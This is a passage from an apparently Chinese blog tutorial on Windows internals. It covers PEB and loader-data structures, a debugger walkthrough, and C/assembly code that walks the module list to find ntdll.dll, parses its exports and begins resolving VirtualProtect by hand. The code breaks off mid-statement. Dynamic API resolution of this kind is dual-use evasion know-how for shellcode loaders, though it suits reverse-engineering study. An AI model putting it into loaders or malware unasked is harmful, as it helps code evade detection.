OSBuildNumber;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubSystem;</span><br><span class="line">    ULONG ImageSubSystemMajorVersion;</span><br><span class="line">    ULONG ImageSubSystemMinorVersion;</span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">0x22</span>];</span><br><span class="line">    ULONG PostProcessInitRoutine;</span><br><span class="line">    ULONG TlsExpansionBitmap;</span><br><span class="line">    BYTE TlsExpansionBitmapBits[<span class="number">0x80</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB, * PPEB;</span><br></pre></td></tr></table></figure><p>我们主要是需要0x0c(64位为0x18)偏移处的<code>PPEB_LDR_DATA</code>结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><p>在<code>PEB_LDR_DATA</code>的0x0c、0x14、0x1c中为三个双向链表<code>LIST_ENTRY</code><br>三个链表加载模块分别代表<strong>模块加载顺序，模块在内存中的加载顺序以及模块初始化装载的顺序</strong>，<code>PEB_LDR_DATA</code>结构类似于一个火车头，三个双向链表<code>LIST_ENTRY</code>意思相同，只是顺序不一样，都指向下一个_LDR_DATA_TABLE_ENTRY结构（也有的定义为<code>_LDR_MODULE</code> 结构）毕竟微软没有公开结构，只要我们所需的偏移一致就行。<br><strong>_LDR_DATA_TABLE_ENTRY 32位版本：</strong></p><img src="/post/db27253d/1678441105093-4fb57c3a-5abd-477d-b806-adb566de0139.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InLoadOrderLinks;                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InMemoryOrderLinks;                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InInitializationOrderLinks;                          <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> FullDllName;                                     <span class="comment">//0x24</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> BaseDllName;                                     <span class="comment">//0x2c</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x34</span></span><br><span class="line">    USHORT LoadCount;                                                       <span class="comment">//0x38</span></span><br><span class="line">    USHORT TlsIndex;                                                        <span class="comment">//0x3a</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> HashLinks;                                       <span class="comment">//0x3c</span></span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            VOID* SectionPointer;                                           <span class="comment">//0x3c</span></span><br><span class="line">            ULONG CheckSum;                                                 <span class="comment">//0x40</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG TimeDateStamp;                                                <span class="comment">//0x44</span></span><br><span class="line">        VOID* LoadedImports;                                                <span class="comment">//0x44</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT</span>* EntryPointActivationContext;                <span class="comment">//0x48</span></span><br><span class="line">    VOID* PatchInformation;                                                 <span class="comment">//0x4c</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ForwarderLinks;                                      <span class="comment">//0x50</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ServiceTagLinks;                                     <span class="comment">//0x58</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> StaticLinks;                                         <span class="comment">//0x60</span></span><br><span class="line">    VOID* ContextInformation;                                               <span class="comment">//0x68</span></span><br><span class="line">    ULONG OriginalBase;                                                     <span class="comment">//0x6c</span></span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> LoadTime;                                          <span class="comment">//0x70</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>_LDR_DATA_TABLE_ENTRY64 64位版本：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY64</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> InLoadOrderLinks;                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> InMemoryOrderLinks;                                  <span class="comment">//0x10</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> InInitializationOrderLinks;                          <span class="comment">//0x20</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x30</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x38</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x40</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> FullDllName;                                     <span class="comment">//0x48</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> BaseDllName;                                     <span class="comment">//0x58</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x68</span></span><br><span class="line">    USHORT LoadCount;                                                       <span class="comment">//0x6c</span></span><br><span class="line">    USHORT TlsIndex;                                                        <span class="comment">//0x6e</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> HashLinks;                                       <span class="comment">//0x70</span></span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            VOID* SectionPointer;                                           <span class="comment">//0x70</span></span><br><span class="line">            ULONG CheckSum;                                                 <span class="comment">//0x78</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG TimeDateStamp;                                                <span class="comment">//0x80</span></span><br><span class="line">        VOID* LoadedImports;                                                <span class="comment">//0x80</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT</span>* EntryPointActivationContext;                <span class="comment">//0x88</span></span><br><span class="line">    VOID* PatchInformation;                                                 <span class="comment">//0x90</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> ForwarderLinks;                                      <span class="comment">//0x98</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> ServiceTagLinks;                                     <span class="comment">//0xa8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LIST_ENTRY64</span> StaticLinks;                                         <span class="comment">//0xb8</span></span><br><span class="line">    VOID* ContextInformation;                                               <span class="comment">//0xc8</span></span><br><span class="line">    ULONGLONG OriginalBase;                                                 <span class="comment">//0xd0</span></span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> LoadTime;                                          <span class="comment">//0xd8</span></span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY64, * PLDR_DATA_TABLE_ENTRY64;</span><br></pre></td></tr></table></figure><p><strong>_LDR_MODULE 版本：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_MODULE</span> &#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID BaseAddress;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    SHORT LoadCount;</span><br><span class="line">    SHORT TlsIndex;</span><br><span class="line">    LIST_ENTRY HashTableEntry;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_MODULE, * PLDR_MODULE;</span><br></pre></td></tr></table></figure><p><code>PPEB_LDR_DATA</code>结构是一个入口，类似于火车头，里面<code>_LIST_ENTRY-&gt;Flink</code>指向第一个_LDR_DATA_TABLE_ENTRY，然后第一个指向第二个以此类推，最后一个指向第一个，而<code>_LIST_ENTRY-&gt;Blink</code>指向的是上一个火车，第二个指向火车头，火车头指向最后一个。</p><img src="/post/db27253d/1678441641758-dfd9ac3a-205f-470e-b440-6f4ba6bcbc99.png" class=""><p>这是广为流传的一张图，大多数文章都会拿它做案例，但其实它有一点点错误（吐槽：这么多人都没发现)，Blink指向的并不是上一个Blink，而是指向上一个<code>LIST_ENTRY</code>的地址，下面进行详细分析。</p><h3 id="解析PEB："><a href="#解析PEB：" class="headerlink" title="解析PEB："></a>解析PEB：</h3><p>我们如何找到PEB的地址？这里有三种方法：</p><ol><li>查看OD等调试器的寄存器窗口，fs段寄存器的后面会接着TEB结构指针。直接在内存窗口跳过去即可</li><li>通过fs的值拆分成段选择子，通过GDT表查找段描述符，得到一个3环的调用门….#*#%$()#…..  很显然我不会，直接放弃。</li><li>第三种是最方便的，32位：fs:[0x18]存储着TEB结构指针，fs:[0x30]存储着PEB结构指针。64位：gs:[0x60]存储着PEB结构指针。</li></ol><p>为什么不能通过fs直接过去呢？因为fs存储的是段选择子，不是真正的地址所以需要通过偏移。<br>接下来尝试手动解析：这里用的是64位exe，工具x64dbg</p><img src="/post/db27253d/1678442221771-ed156fe0-67dd-442e-8fe4-312cd5b4005e.png" class=""><p>利用gs:[0x60]获取PEB地址，也可以直接用peb()快捷获取，得到地址：000000CA38C50000，ctrl+g跳转，此时就是PEB的结构指针。我们在0x18h(在64位下偏移是18h)处找到<code>PPEB_LDR_DATA</code>地址00007FF8E7B1C4C0</p><img src="/post/db27253d/1678677608598-6b58788b-2e47-4a18-89f2-ac2001f8dad2.png" class=""><p>跳转到<code>PPEB_LDR_DATA</code>处,0X20处偏移是我们要找的第一个<code>LDR_DATA_TABLE_ENTRY</code>的<code>InMemoryOrderModuleList</code>地址：0000021892B02820，此时</p><ul><li>Flink地址：0000021892B02650</li><li>Blink地址：00007FF8E7B1C4E0</li></ul><img src="/post/db27253d/1678690802015-b4a28afd-fb9f-4dd1-b901-c214e5311f3e.png" class=""><ul><li>EntryPoint：00007FF7A96916E0</li><li>FullDllName：（0x58-0x60）</li><li>BaseDllName：(0x68-0x70)</li></ul><p>根据Flink跳转至下一个<code>LDR_DATA_TABLE_ENTRY</code></p><img src="/post/db27253d/1678691622423-45b01e51-1b0f-4586-a5cf-37ac53366bf0.png" class=""><p>下一个_LDR_DATA_TABLE_ENTRY结构的<code>InMemoryOrderModuleList</code>处<br>此时Flink：0000021892B02D70指向下一个<code>InMemoryOrderModuleList</code>地址，Blink：0000021892B02820刚好指向了上一个<code>InMemoryOrderModuleList</code>地址</p><ul><li>FullDllName：c:\windows\system32\ntdll.dll</li><li>BaseDllName：ntdll.dll</li></ul><p>继续下一跳，Flink：0000021892B02D70，Blink：0000021892B02650刚好指向ntdll.dll的<code>InMemoryOrderModuleList</code>起始地址</p><img src="/post/db27253d/1678691953598-bd24213c-7a93-4482-bc71-d03695d60145.png" class=""><p>我们可以依次遍历下去，找到我们所需要的基址</p><h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><p>微软很贴心的提供了两个获取PEB的api</p><ul><li><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170&viewFallbackFrom=vs-2019">__readgsqword</a> 64位</li><li><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170&viewFallbackFrom=vs-2019">__readfsqword</a>  32位</li></ul><p>我们也可以不用Windows的api</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 64位</span></span><br><span class="line">.CODE</span><br><span class="line">  GetPeb64 PROC</span><br><span class="line">    mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">  ret</span><br><span class="line">  GetPeb64 ENDP</span><br><span class="line"> END</span><br><span class="line"></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">.CODE</span><br><span class="line">    GetPeb32 PROC</span><br><span class="line">    mov rax, fs:[<span class="number">30</span>h];</span><br><span class="line">    ret;</span><br><span class="line">    GetPeb32 ENDP</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接找到ldr地址</span></span><br><span class="line">.CODE</span><br><span class="line">    GetPebLdr PROC</span><br><span class="line">    mov rax, gs:[<span class="number">60</span>h];</span><br><span class="line">    add rax, <span class="number">18</span>h;</span><br><span class="line">    mov rax, [rax];</span><br><span class="line">    ret;</span><br><span class="line">    GetPebLdr ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>asm.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __ASMCODE_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 _cdecl <span class="title">GetPeb</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h4 id="定义结构体查找导出函数地址："><a href="#定义结构体查找导出函数地址：" class="headerlink" title="定义结构体查找导出函数地址："></a>定义结构体查找导出函数地址：</h4><p>注：结构体定义太长了没贴上来，对着上面抄就行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;global.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_FILE_HEADER pFile = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptional = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = <span class="literal">NULL</span>;</span><br><span class="line">PMPEB peb = (PMPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">PLDR_DATA_TABLE_ENTRY64 pLdr = <span class="literal">NULL</span>;</span><br><span class="line">PBYTE imageBase = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use PEB to find the base address of ntdll.dll</span></span><br><span class="line">pLdr = (PLDR_DATA_TABLE_ENTRY64)((PBYTE)peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink - <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]name:%s\n&quot;</span>, pLdr-&gt;BaseDllName.Buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]DllBase:%p\n&quot;</span>, (PBYTE)pLdr-&gt;DllBase);</span><br><span class="line"><span class="keyword">while</span> ((_wcsicmp(pLdr-&gt;BaseDllName.Buffer, <span class="string">L&quot;ntdll.dll&quot;</span>)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pLdr = (PLDR_DATA_TABLE_ENTRY64)((PBYTE)pLdr-&gt;InMemoryOrderLinks.Flink - <span class="number">0x10</span>);</span><br><span class="line">imageBase = (PBYTE)pLdr-&gt;DllBase;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]name: %s\n&quot;</span>,pLdr-&gt;BaseDllName.Buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]DllBase: %p\n&quot;</span>, imageBase);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]find ntdll.dll address.....\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// find the exported functions of ntdll.dll</span></span><br><span class="line">pDos = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line"><span class="keyword">if</span> (*(PWORD)pDos != <span class="number">0x5A4D</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]pe parsing failed..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pOptional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)pDos + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(DWORD) + <span class="built_in">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + pOptional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(imageBase + pExport-&gt;AddressOfFunctions));</span><br><span class="line">PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)imageBase + pExport-&gt;AddressOfNames);</span><br><span class="line">PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)imageBase + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; pExport-&gt;NumberOfNames; cx++)</span><br><span class="line">&#123;</span><br><span class="line">PCHAR pczFunctionName = (PCHAR)((PBYTE)imageBase + pdwAddressOfNames[cx]);</span><br><span class="line">PVOID pFunctionAddress = (PBYTE)imageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="直接利用偏移："><a href="#直接利用偏移：" class="headerlink" title="直接利用偏移："></a>直接利用偏移：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;getPeb.h&quot;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// custom VirtualProtect function</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* CustomVirtualProtect)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)</span></span>;</span><br><span class="line">CustomVirtualProtect myVirtualProtect;</span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">GetFunctionAddress</span><span class="params">(PVOID pBaseAddress, PCHAR pFunctionName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_FILE_HEADER pFile = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptional = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = <span class="literal">NULL</span>;</span><br><span class="line">PVOID getFunctionAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">pDos = (PIMAGE_DOS_HEADER)pBaseAddress;</span><br><span class="line"><span class="keyword">if</span> (*(PWORD)pDos != <span class="number">0x5A4D</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]pe parsing failed..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pOptional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)pDos + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(DWORD) + <span class="built_in">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pBaseAddress + pOptional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pBaseAddress + pExport-&gt;AddressOfFunctions);</span><br><span class="line">PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pBaseAddress + pExport-&gt;AddressOfNames);</span><br><span class="line">PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pBaseAddress + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; pExport-&gt;NumberOfNames; cx++)</span><br><span class="line">&#123;</span><br><span class="line">PCHAR pczFunctionName = (PCHAR)((PBYTE)pBaseAddress + pdwAddressOfNames[cx]);</span><br><span class="line">PVOID pFunctionAddress = (PBYTE)pBaseAddress + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == _strnicmp(pczFunctionName, pFunctionName, <span class="built_in">strlen</span>(pczFunctionName)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">getFunctionAddress = pFunctionAddress;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> getFunctionAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID64 peb = <span class="built_in">GetPeb64</span>();</span><br><span class="line">PVOID64 PEB_LDR_DATA = *(PVOID64**)((PBYTE)peb + <span class="number">0x18</span>);</span><br><span class="line">PVOID64 PEB_LDR_TABLE_ENTRY = (PVOID64)((PBYTE)PEB_LDR_DATA + <span class="number">0x20</span>);</span><br><span class="line">UNICODE_STRING* fullName = <span class="literal">NULL</span>;</span><br><span class="line">LIST_ENTRY* pListEntry = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hKernel32 = <span class="literal">NULL</span>;</span><br><span class="line">PVOID apiID = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">pListEntry = 